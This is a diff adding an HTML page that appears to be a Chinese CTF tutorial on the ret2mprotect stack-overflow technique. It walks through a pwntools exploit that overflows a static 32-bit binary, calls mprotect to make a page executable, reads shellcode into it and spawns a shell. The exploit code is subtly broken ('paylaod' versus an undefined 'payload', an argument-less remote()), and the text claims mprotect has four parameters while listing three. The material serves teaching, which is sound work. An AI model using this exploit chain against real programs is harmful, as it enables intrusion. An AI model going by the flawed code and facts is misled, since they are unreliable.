@@ -1,0 +1,75 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="93148f90d87ac176a911df198f5c155c"><strong>1.前言</strong></h2>
+<p>ret2mprotect是栈溢出的一项，当我们经过ret2text，ret2shellcode，re2libc后我们就有可以会遇到这样一个攻击手段，但是我发现网上大部分对这个并没有仔细的解释每一步的用法和意思，可以会让很多刚入门的人出现疑问，提出为什么，那么今天我就写一个我认为的全解吧，如果有不足或者错误希望有师傅可以提出来，大家一起交流学习。</p>
+<hr/>
+<h2 data-content="1" id="5bacf91903e5a8721faab54fafdd9c72"><strong>mprotect函数原型</strong></h2>
+<p>ret2mprotect最重要的就是mprotect函数，所以我们需要对这个函数进行了解，首先看这个函数的原型</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240910132906-98feecd6-6f35-1.png"/><br/>
+当我们在IDA中看到的这个函数是这个样子，所以我找出了这个函数的原型进行了对比<br/>
+'''<br/>
+int mprotect(void *addr, size_t len, int prot);<br/>
+'''</p>
+<p>我们可以看到这个这个函数的原型中有4个参数，其中的含义如下：</p>
+<ul>
+<li>void* start:区段开始的位置(第一个参数填的是地址，是指要进行操作的地址)</li>
+<li>size_t len: 区段的大小(第二个参数是地址往后多大的长度)</li>
+<li>int prot:   区段的权限(可以用16进制来表示)(第三个参数的是要赋予的权限)</li>
+</ul>
+<p>mprotect() 函数把自start开始的，长度位len的内存区的保护属性修改位prot指定的值  比如7就是可读可写可执行。<br/>
+指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址， （在题目中大部分的ret2mprotect函数都是在静态编译的题目）<br/>
+并且区间长度len必须是页大小的整数倍。因为程序本身也是静态编译，所以地址是不会变的。</p>
+<h2 data-content="1" id="2b4bc92353bae01ed1e6d787514082db"><strong>32位mprotect利用</strong></h2>
+<p>首先我们遇到题目第一步就是checksec查看文件</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240910134441-c680a0f8-6f37-1.png"/><br/>
+我们可以看到Canary是开启的，为什么会显示开启这个保护呢，因为在编译的时候有一个函数影响的<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240910134640-0daa83fe-6f38-1.png"/><br/>
+就是因为这个函数被我们的checksec检测到了所以会显示开启了Canary保护，还有一种说法是因为checksec版本过低导致的，可以尝试更新，不过我用习惯了，就没有再去更新这个东西，因为对我的影响并不是很大。<br/>
+那么我们就直接打开IDA查看这个程序<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240910135006-8844be40-6f38-1.png"/><br/>
+可以看到左边有很多函数，所以一下就看出来这是一个静态编译的程序，静态编译的程序gadget非常的多，我们可以利用 ropper -f ./pwn --search "pop"直接去找我们要的指令<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240910135148-c4c690a0-6f38-1.png"/><br/>
+那么遇到这种题目的时候我们可以根据上面我们了解到的mprotect函数的原型和特性来做这一道题目了，题目中是不会给system和/bin/sh的，所以我们可以利用这个函数的特性去修改一个区段的全写来写入shellcode来完成这个题目,既然是吸入，那么肯定也是要利用一个read函数来进行写入的（前提是题目中有），我们可以了解一下read函数的原型：<br/>
+read 函数原型<br/>
+read(int fd,void*buf,size_t count)<br/>
+fd : 是文件描述 (设置为0)<br/>
+buf： 为读出数据的缓冲区  (缓冲区的长度)<br/>
+count：为每次读取的字节数(是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移)</p>
+<p>很明显要构造的函数就只有三个，所以我们就可以根据上面的两个函数的来构造攻击来完成这个漏洞利用</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">()</span> <span class="c1">#远程</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./pwn"</span><span class="p">)</span> <span class="c1">#方便找到文件中的地址 </span>
+<span class="n">mprotect_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'mprotect'</span><span class="p">]</span> <span class="c1">#直接使用elf找地址</span>
+<span class="n">read_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]</span>
+<span class="n">pop_ebx_esi_ebp_ret_addr</span> <span class="o">=</span> <span class="mh">0x80a019b</span>    <span class="c1">#指令的地址</span>
+<span class="n">mpstart_addr</span> <span class="o">=</span> <span class="mh">0x80DA000</span>                <span class="c1">#一个区段的开始位置</span>
+<span class="n">mpsize_addr</span> <span class="o">=</span> <span class="mh">0x1000</span>                    <span class="c1">#这个区段的大小</span>
+<span class="n">mpprot_addr</span> <span class="o">=</span> <span class="mh">0x7</span>                       <span class="c1">#给这个区段赋予的权限  7在Linux中是可读可写可执行</span>
+<span class="n">paylaod</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x6C</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mprotect_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mpstart_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mpsize_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mpprot_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mpstart_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mpsize_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mpstart_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">paylaod</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<p>那么我再给大家仔细解释一下这个exp</p>
+<div class="highlight"><pre><span></span><span class="n">pop_ebx_esi_ebp_ret_addr</span> <span class="o">=</span> <span class="mh">0x80a019b</span>
+</pre></div>
+<p>首先我们会疑问为什么会用到这个指令，就是因为mprotect函数的原型中，是有三个我们需要操作的参数的，所以我们需要用到3个指令来进行调用</p>
+<div class="highlight"><pre><span></span><span class="n">paylaod</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x6C</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mprotect_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mpstart_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mpsize_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mpprot_addr</span><span class="p">)</span>
+</pre></div>
+<p>那么再看这个payload我们为什么要这样写，（前面我们是知道是一个溢出的位数），因为我们在需要利用这个函数去控制一个区段的大小，所以重要的是mpprot_addr,我们把这个设置位7也就是可读可写可执行。<br/>
+剩下的就是一个流程过来了。<br/>
+然后再看下一段</p>
+<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mpstart_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mpsize_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mpstart_addr</span><span class="p">)</span>
+</pre></div>
+<p>可以看到是从read函数开始的，因为我们要进行写入shellcode，所以read函数也要加入流程当中，然后利用这个指令去调用三个参数，最后到能够区段开始的地址。我们就可以进行输入了。</p>
+<div class="highlight"><pre><span></span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</pre></div>
+<p>这个时候可以利用pwntools中的生成shellcode进入写入<br/>
+然后就可以打通这个题目了。</p>
+<h2 data-content="1" id="d03cc9c4e937878c81d3eaed958c6c10"><strong>64位mprotect利用</strong></h2>
+<p>有32位的就有64位的，64位的这个题目有一些不一样，只是寄存器传参的不一样，同时可以利用其他的解法来做会更加的方便，比如说libc，或者syscall。同时希望大家能够在懂原理的情况下自我思考。</p>
+<p>现在只是希望做的更加通俗易懂一些，让小白能够理解的更加透彻如果有什么不对希望大家指正</p>
+</div>
+</div>
